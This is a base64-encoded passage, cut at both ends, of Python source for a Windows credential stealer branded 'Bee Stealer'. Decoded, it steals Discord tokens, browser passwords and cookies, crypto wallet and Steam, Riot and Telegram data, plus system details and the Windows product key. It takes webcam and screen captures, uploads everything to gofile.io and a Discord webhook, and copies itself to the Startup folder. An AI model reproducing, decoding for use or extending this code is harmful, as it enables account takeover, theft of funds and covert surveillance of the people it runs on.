WFza197YnJvd3Nlcn0iCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnCiAgICAKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybgogICAgc3VicHJvY2Vzcy5Qb3BlbihmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mID5udWwgMj4mMSIsIHNoZWxsPVRydWUpCgogICAgaWYgIldhbGxldCIgaW4gYXJnIG9yICJOYXRpb25zR2xvcnkiIGluIGFyZzoKICAgICAgICBicm93c2VyID0gcGF0aC5zcGxpdCgiXFwiKVs0XS5zcGxpdCgiLyIpWzFdLnJlcGxhY2UoJyAnLCAnJykKICAgICAgICBuYW1lID0gZiJ7YnJvd3Nlcn0iCgogICAgZWxpZiAiU3RlYW0iIGluIGFyZzoKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIik6IHJldHVybgogICAgICAgIGYgPSBvcGVuKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIsICJyKyIsIGVuY29kaW5nPSJ1dGY4IikKICAgICAgICBkYXRhID0gZi5yZWFkbGluZXMoKQogICAgICAgICMgcHJpbnQoZGF0YSkKICAgICAgICBmb3VuZCA9IEZhbHNlCiAgICAgICAgZm9yIGwgaW4gZGF0YToKICAgICAgICAgICAgaWYgJ1JlbWVtYmVyUGFzc3dvcmQiXHRcdCIxIicgaW4gbDoKICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZQogICAgICAgIGlmIGZvdW5kID09IEZhbHNlOiByZXR1cm4KICAgICAgICBuYW1lID0gYXJnCgoKICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgIGlmIG5vdCAiLnppcCIgaW4gZmlsZTogemYud3JpdGUocGF0aEMgKyAiLyIgKyBmaWxlKQogICAgemYuY2xvc2UoKQoKICAgIGxuaWsgPSB1cGxvYWRUb0Fub25maWxlcyhmJ3twYXRoQ30ve25hbWV9LnppcCcpCiMgICAgIGxuaWsgPSAiaHR0cHM6Ly9nb29nbGUuY29tIgogICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikKCiAgICBpZiAiV2FsbGV0IiBpbiBhcmcgb3IgImVvZ2FlYW9laGxlZiIgaW4gYXJnOgogICAgICAgIFdhbGxldHNaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkKICAgIGVsaWYgIk5hdGlvbnNHbG9yeSIgaW4gbmFtZSBvciAiU3RlYW0iIGluIG5hbWUgb3IgIlJpb3RDbGkiIGluIG5hbWU6CiAgICAgICAgR2FtaW5nWmlwLmFwcGVuZChbbmFtZSwgbG5pa10pCiAgICBlbHNlOgogICAgICAgIE90aGVyWmlwLmFwcGVuZChbbmFtZSwgbG5pa10pCgoKZGVmIEdhdGhlckFsbCgpOgogICAgJyAgICAgICAgICAgICAgICAgICBEZWZhdWx0IFBhdGggPCAwID4gICAgICAgICAgICAgICAgICAgICAgICAgUHJvY2VzTmFtZSA8IDEgPiAgICAgICAgVG9rZW4gIDwgMiA+ICAgICAgICAgICAgICBQYXNzd29yZCA8IDMgPiAgICAgQ29va2llcyA8IDQgPiAgICAgICAgICAgICAgICAgICAgICAgICAgRXh0ZW50aW9ucyA8IDUgPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnCiAgICBicm93c2VyUGF0aHMgPSBbCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIEdYIFN0YWJsZSIsICAgICAgICAgICAgICAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgU3RhYmxlIiwgICAgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBOZW9uL1VzZXIgRGF0YS9EZWZhdWx0IiwgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgU3hTL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICJicmF2ZS5leGUiLCAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9ZYW5kZXgvWWFuZGV4QnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgInlhbmRleC5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0hvdWdhQm91Z2EvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L01pY3Jvc29mdC9FZGdlL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAiZWRnZS5leGUiLCAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdCiAgICBdCgogICAgZGlzY29yZFBhdGhzID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9EaXNjb3JkIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICBbZiJ7cm9hbWluZ30vTGlnaHRjb3JkIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZGNhbmFyeSIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmRwdGIiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgXQoKICAgIFBhdGhzVG9aaXAgPSBbCiAgICAgICAgW2Yie3JvYW1pbmd9L2F0b21pYy9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAnIkF0b21pYyBXYWxsZXQuZXhlIicsICJXYWxsZXQiXSwKICAgICAgICBbZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1cy53YWxsZXQiLCAiRXhvZHVzLmV4ZSIsICJXYWxsZXQiXSwKICAgICAgICBbIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcU3RlYW1cY29uZmlnIiwgInN0ZWFtLmV4ZSIsICJTdGVhbSJdLAogICAgICAgIFtmIntyb2FtaW5nfS9OYXRpb25zR2xvcnkvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgIk5hdGlvbnNHbG9yeS5leGUiLCAiTmF0aW9uc0dsb3J5Il0sCiAgICAgICAgW2Yie2xvY2FsfS9SaW90IEdhbWVzL1Jpb3QgQ2xpZW50L0RhdGEiLCAiUmlvdENsaWVudFNlcnZpY2VzLmV4ZSIsICJSaW90Q2xpZW50Il0KICAgIF0KICAgIFRlbGVncmFtID0gW2Yie3JvYW1pbmd9L1RlbGVncmFtIERlc2t0b3AvdGRhdGEiLCAndGVsZWdyYW0uZXhlJywgIlRlbGVncmFtIl0KCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6IAogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRUb2tlbiwgYXJncz1bcGF0dFswXSwgcGF0dFsyXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKICAgIGZvciBwYXR0IGluIGRpc2NvcmRQYXRoczogCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUdldERpc2NvcmQsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCgogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiAKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0UGFzc3csIGFyZ3M9W3BhdHRbMF0sIHBhdHRbM11dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCgogICAgVGhDb2trID0gW10KICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldENvb2tpZSwgYXJncz1bcGF0dFswXSwgcGF0dFs0XV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhDb2trLmFwcGVuZChhKQoKICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUdhdGhlclppcHMsIGFyZ3M9W2Jyb3dzZXJQYXRocywgUGF0aHNUb1ppcCwgVGVsZWdyYW1dKS5zdGFydCgpCgoKICAgIGZvciB0aHJlYWQgaW4gVGhDb2trOiB0aHJlYWQuam9pbigpCiAgICBERVRFQ1RFRCA9IFRydXN0KENvb2tpZXMpCiAgICBpZiBERVRFQ1RFRCA9PSBUcnVlOiByZXR1cm4KCiAgICAjIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoKICAgICMgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFs1XSwgcGF0dFsxXV0pLnN0YXJ0KCkKICAgIAogICAgIyBmb3IgcGF0dCBpbiBQYXRoc1RvWmlwOgogICAgIyAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdLCBwYXR0WzFdXSkuc3RhcnQoKQogICAgCiAgICAjIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRlbGVncmFtLCBhcmdzPVtUZWxlZ3JhbVswXSwgVGVsZWdyYW1bMl0sIFRlbGVncmFtWzFdXSkuc3RhcnQoKQoKICAgIGZvciB0aHJlYWQgaW4gVGhyZWFkbGlzdDogCiAgICAgICAgdGhyZWFkLmpvaW4oKQogICAgZ2xvYmFsIHVwdGhzCiAgICB1cHRocyA9IFtdCgogICAgZm9yIGZpbGUgaW4gWyJ3cHBhc3N3LnR4dCIsICJ3cGNvb2sudHh0Il06IAogICAgICAgICMgdXBsb2FkKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpCiAgICAgICAgdXBsb2FkKGZpbGUucmVwbGFjZSgiLnR4dCIsICIiKSwgdXBsb2FkVG9Bbm9uZmlsZXMob3MuZ2V0ZW52KCJURU1QIikgKyAiXFwiICsgZmlsZSkpCgpkZWYgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCk6CiAgICB0cnk6cmV0dXJuIHJlcXVlc3RzLnBvc3QoZidodHRwczovL3tyZXF1ZXN0cy5nZXQoImh0dHBzOi8vYXBpLmdvZmlsZS5pby9nZXRTZXJ2ZXIiKS5qc29uKClbImRhdGEiXVsic2VydmVyIl19LmdvZmlsZS5pby91cGxvYWRGaWxlJywgZmlsZXM9eydmaWxlJzogb3BlbihwYXRoLCAncmInKX0pLmpzb24oKVsiZGF0YSJdWyJkb3dubG9hZFBhZ2UiXQogICAgZXhjZXB0OnJldHVybiBGYWxzZQoKZGVmIGdyYWJfdG9rZW5zKCk6CiAgICB0b2tlbl9jb3VudCA9IDAKICAgIG1lc3NhZ2UgPSAiIgogICAgCiAgICBsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKICAgIHJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQoKICAgIHRva2VucGF0aHMgPSB7CiAgICAgICAgJ0Rpc2NvcmQnOiByb2FtaW5nICsgJ1xcRGlzY29yZCcsCiAgICAgICAgJ0Rpc2NvcmQgQ2FuYXJ5Jzogcm9hbWluZyArICdcXGRpc2NvcmRjYW5hcnknLAogICAgICAgICdEaXNjb3JkIFBUQic6IHJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiJywKICAgICAgICAnR29vZ2xlIENocm9tZSc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ09wZXJhJzogcm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGUnLAogICAgICAgICdCcmF2ZSc6IGxvY2FsICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0JywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcKICAgIH0KICAgIAogICAgZGVmIGZpbmRfdG9rZW5zKHBhdGgpOgogICAgICAgIHBhdGggKz0gJ1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYicKCiAgICAgICAgdG9rZW5zID0gW10KCiAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxlX25hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyJ1tcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI3fScsIHInbWZhXC5bXHctXXs4NH0nKToKICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIHRva2Vucy5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIHRva2VucwoKICAgIGZvciBwbGF0Zm9ybSwgcGF0aCBpbiB0b2tlbnBhdGhzLml0ZW1zKCk6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICB0b2tlbnMgPSBmaW5kX3Rva2VucyhwYXRoKQoKICAgICAgICBpZiBsZW4odG9rZW5zKSA+IDA6CiAgICAgICAgICAgIGZvciB0b2tlbiBpbiB0b2tlbnM6CiAgICAgICAgICAgICAgICBtZXNzYWdlICs9IGYne3Rva2VufVxuJwogICAgICAgICAgICAgICAgdG9rZW5fY291bnQgPSB0b2tlbl9jb3VudCArIDEKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXNzCgogICAgd2l0aCBvcGVuKCJ0b2tlbnMudHh0IiwgImEiKSBhcyB0b2tlbnNmaWxlOgogICAgICAgIHRva2Vuc2ZpbGUud3JpdGUobWVzc2FnZSkKCiAgICBmaWxlX3BhdGggPSAidG9rZW5zLnR4dCIKICAgIGZpbGV1cmwgPSB1cGxvYWRUb0Fub25maWxlcyhmaWxlX3BhdGgpCiAgICByZXF1ZXN0cy5wb3N0KGhvb2ssIGpzb249ewogICAgICAgICAgICAgICJjb250ZW50IjogZ2xvYmFsSW5mbygpLAogICAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJCZWUgPiBEaXNjb3JkIFRva2VucyIsCiAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiKipGb3VuZCBUb2tlbnMgSW46KipcblxuW0Rpc2NvcmQgQXBwXShodHRwczovL3d3dy5kaXNjb3JkLmNvbS8pIHwgW0Rpc2NvcmQgQ2FuYXJ5XShodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS9kb3dubG9hZC9jYW5hcnk/cGxhdGZvcm09d2luKSB8IFtEaXNjb3JkIFBUQl0oaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvZG93bmxvYWQvcHRiP3BsYXRmb3JtPXdpbikgIHwgW0Nocm9tZV0oaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9pbnRsL2VuX2llL2Nocm9tZS8pIHwgW09wZXJhXShodHRwczovL3d3dy5vcGVyYS5jb20vKSB8IFtCcmF2ZSBCcm93c2VyXShodHRwczovL2JyYXZlLmNvbS8pIHwgW1lhbmRleF0oaHR0cHM6Ly95YW5kZXguY29tLylcblxu8J+UkSAqKsK3IHt0b2tlbl9jb3VudH0qKiBUb2tlbnMgRm91bmRcbvCflJcgKirCtyoqIFtCZWVUb2tlbnMudHh0XSh7ZmlsZXVybH0pIiwKICAgICAgICAgICAgICAgICAgImNvbG9yIjogMTM5LAogICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkJlZSBTdGVhbGVyIHwgQXJ4aWZ5IzAwMDEiCiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICJ1c2VybmFtZSI6ICJCZWUgU3RlYWxlciIsCiAgICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICAgICAgfSkKCmdyYWJfdG9rZW5zKCkKCgpkZWYgc2VuZF9zeXN0ZW1faW5mbygpOgogICAgcGNfbmFtZSA9IG9zLmdldGVudigiVVNFUk5BTUUiKQogICAgbm9kZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpCiAgICBvc25hbWUgPSBzdWJwcm9jZXNzLnJ1bignd21pYyBvcyBnZXQgQ2FwdGlvbicsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHNoZWxsPVRydWUpLnN0ZG91dC5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zdHJpcCgpLnNwbGl0bGluZXMoKVsyXS5zdHJpcCgpCiAgICBpcF9hZGRyID0gZ2V0aXAoKQogICAgbm9kZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpCgogICAgIyBsb2NhbCBpcAogICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgcy5jb25uZWN0KCgiOC44LjguOCIsIDgwKSkKICAgIGxvY2FsX2lwID0gcy5nZXRzb2NrbmFtZSgpWzBdCiAgICBzLmNsb3NlKCkKCiAgICBwcm9kdWN0X2tleSA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCd3bWljIHBhdGggc29mdHdhcmVsaWNlbnNpbmdzZXJ2aWNlIGdldCBPQTN4T3JpZ2luYWxQcm9kdWN0S2V5JykuZGVjb2RlKCkuc3BsaXQoJ1xuJylbMV0uc3RyaXAoKQogICAgaHdpZCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCJ3bWljIGNzcHJvZHVjdCBnZXQgdXVpZCIpLmRlY29kZSgpLnNwbGl0KCJcbiIpWzFdLnN0cmlwKCkKCiAgICAjIG1hYyBhZGRyZXNzCiAgICBpbnRlcmZhY2UsIGFkZHJzID0gbmV4dChpdGVyKHBzdXRpbC5uZXRfaWZfYWRkcnMoKS5pdGVtcygpKSkKICAgIG1hYyA9IGFkZHJzWzBdLmFkZHJlc3MKCiAgICAjcmFtCiAgICByYW0gPSBzdHIoaW50KGludChzdWJwcm9jZXNzLnJ1bignd21pYyBjb21wdXRlcnN5c3RlbSBnZXQgdG90YWxwaHlzaWNhbG1lbW9yeScsIGNhcHR1cmVfb3V0cHV0PVRydWUsCiAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlKS5zdGRvdXQuZGVjb2RlKGVycm9ycz0naWdub3JlJykuc3RyaXAoKS5zcGxpdCgpWzFdKSAvIDEwMDAwMDAwMDApKSArICJHQiIKCiAgICAjY2xvc2UKICAgIGdwdSA9IHN1YnByb2Nlc3MucnVuKCJ3bWljIHBhdGggd2luMzJfVmlkZW9Db250cm9sbGVyIGdldCBuYW1lIiwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgc2hlbGw9VHJ1ZSkuc3Rkb3V0LmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnNwbGl0bGluZXMoKVsyXS5zdHJpcCgpCiAgICBjcHUgPSBzdWJwcm9jZXNzLnJ1bihbIndtaWMiLCAiY3B1IiwgImdldCIsICJOYW1lIl0sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkuc3Rkb3V0LnN0cmlwKCkuc3BsaXQoJ1xuJylbMl0KCiAgICAKICAgIHJlcXVlc3RzLnBvc3QoaG9vaywganNvbj17CiAgICAgICJjb250ZW50IjogZ2xvYmFsSW5mbygpLAogICAgICAiZW1iZWRzIjogWwogICAgICAgIHsKICAgICAgICAgICJ0aXRsZSI6ICJCZWUgPiBTeXN0ZW0gSW5mb3JtYXRpb24gU3RlYWxlciIsCiAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIvCfkrsgKip7cGNfbmFtZX0qKlxuXG7wn5K7ICoqUEMgVXNlcm5hbWU6KiogLSBge3BjX25hbWV9YFxu8J+WpSAqKlBDIE5vZGU6KiogLSBge25vZGV9YFxu8J+MkCAqKk9TOioqIC0gYHtvc25hbWV9YFxuXG7wn4yQICoqSVA6KiogLSBge2lwX2FkZHJ9YFxu8J+NjyAqKk1BQzoqKiAtIGB7bWFjfWBcbvCflKcgKipIV0lEOioqIC0gYHtod2lkfWBcblxu8J+PvCAqKkNQVToqKiAtIGB7Y3B1fWBcbvCfj78gKipHUFU6KiogLSBge2dwdX1gXG7wn5CPICoqUkFNOioqIC0gYHtyYW19YFxuXG7wn6SRICoqUHJvZHVjdCBLZXk6KiogLSBge3Byb2R1Y3Rfa2V5fWBcbvCflqUgKipMb2NhbCBJUDoqKiAtIGB7bG9jYWxfaXB9YCIsCiAgICAgICAgICAiY29sb3IiOiAxMzksCiAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAidGV4dCI6ICJCZWUgU3RlYWxlciB8IEFyeGlmeSMwMDAxIgogICAgICAgICAgfQogICAgICAgIH0KICAgICAgXSwKICAgICAgInVzZXJuYW1lIjogIkJlZSBTdGVhbGVyIiwKICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgIH0pCgpzZW5kX3N5c3RlbV9pbmZvKCkKCmRlZiBjb3B5X3RvX3N0YXJ0dXAoKToKICAgIHRyeToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmIkM6XFxVc2Vyc1xce29zLmdldGxvZ2luKCl9XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwIik6CiAgICAgICAgICAgIHNodXRpbC5jb3B5MihfX2ZpbGVfXywgZiJDOlxcVXNlcnNcXHtvcy5nZXRsb2dpbigpfVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cCIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcGFzcwogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCmRlZiBmYWtlX2Vycm9yKCk6CgltZXNzYWdlYm94LnNob3dlcnJvcigiRXJyb3IiLCAiQ291bGQgbm90IGRlY29kZSBieXRlcyB0byAweGZmZmZkIGluIGxpbmUgNzYiKQoKaWYgc2h1dGRvd24gPT0gVHJ1ZToKCXBhc3MKCSMgVGhpcyBmZWF0dXJlIGlzIGNvbWluZyBzb29uLgoKaWYgcG9ybmh1YiA9PSBUcnVlOgoJaW1wb3J0IHdlYmJyb3dzZXIKCXdlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly93d3cucG9ybmh1Yi5jb20vIikKCmlmIGNhbWVyYSA9PSBUcnVlOgogICAgaW1wb3J0IGN2MgoKICAgIGNhcCA9IGN2Mi5WaWRlb0NhcHR1cmUoMCkKICAgIHJldCwgZnJhbWUgPSBjYXAucmVhZCgpCiAgICBjdjIuaW13cml0ZSgiY2FtZXJhX3NuYXBzaG90LmpwZyIsIGZyYW1lKQogICAgY2FwLnJlbGVhc2UoKQogICAgcmVxdWVzdHMucG9zdChob29rLCBmaWxlcz17CiAgICAgICAgImZpbGUiIDogKCJjYW1lcmFfc25hcHNob3QuanBnIiwgb3BlbigiY2FtZXJhX3NuYXBzaG90LmpwZyIsICJyYiIpLCAiaW1hZ2UvcG5nIikKICAgIH0sIGRhdGE9ewogICAgICAgICJ1c2VybmFtZSIgOiAiQmVlIFN0ZWFsZXIiCiAgICB9KQogICAgb3Muc3lzdGVtKCJkZWwgY2FtZXJhX3NuYXBzaG90LmpwZyIpCgppZiBzY3JlZW5zaG90ID09IFRydWU6CiAgICBpbWcgPSBJbWFnZUdyYWIuZ3JhYigpCiAgICBpbWcuc2F2ZSgiZGVza3RvcF9zY3JlZW5zaG90LnBuZyIsICJQTkciKQogICAgcmVxdWVzdHMucG9zdChob29rLCBmaWxlcz17CiAgICAgICAgImZpbGUiIDogKCJkZXNrdG9wX3NjcmVlbnNob3QucG5nIiwgb3BlbigiZGVza3RvcF9zY3JlZW5zaG90LnBuZyIsICJyYiIpLCAiaW1hZ2UvcG5nIikKICAgIH0sIGRhdGE9ewogICAgICAgICJ1c2VybmFtZSIgOiAiRGlzY29jayBTdGVhbGVyIgogICAgfSkKICAgIG9zLnN5c3RlbSgiZGVsIGRlc2t0b3Bfc2NyZWVuc2hvdC5wbmciKQoKaWYgZmFrZWVycm9yID09IFRydWU6CiAgICBmYWtlX2Vycm9yKCkKCmlmIHN0YXJ0dXAgPT0gVHJ1ZToKICAgIGNvcHlfdG9fc3RhcnR1cCgpCgojIGRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKTpzCiMgICAgIHRyeToKIyAgICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0KIyAgICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpCiMgICAgICAgICB1cmwgPSB1cGxvYWQudGV4dAojICAgICAgICAgcmV0dXJuIHVybAojICAgICBleGNlcHQ6CiMgICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBL